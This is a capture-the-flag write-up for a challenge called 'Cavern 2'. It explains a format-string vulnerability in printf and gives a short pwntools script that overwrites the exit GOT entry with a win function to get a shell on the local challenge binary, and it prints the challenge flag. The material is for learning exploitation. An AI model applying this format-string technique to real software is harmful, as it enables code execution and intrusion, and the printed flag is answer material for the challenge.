# Cavern 2

## Description
I found another binary that prints stuff, but I'm having a severe case of _writer_'s block, so you don't get a funny prompt. Have fun!

## Solution
Here's another quick `pwntools` script (you need to `pip install pwntools` if you don't have it). Since the binary passes a format string as the first argument to `printf()`, we can write arbitrary data at an arbitrary location. To get a shell, we can overwite the GOT entry for `exit` with the provided `win` function, so any subsequent calls to `exit` will call our `win` function.

```python

from pwn import *

elf = ELF("./cavern_2")

context.binary = elf
context.log_level = "debug"

io = process([elf.path])
exit_got = elf.got["exit"]
win = elf.sym["win"]
payload = fmtstr_payload(6, { exit_got: win })
io.sendline(payload)
io.interactive()
```

Flag: `gigem{i_h0p3_y0u_us3d_pwnt00ls}`
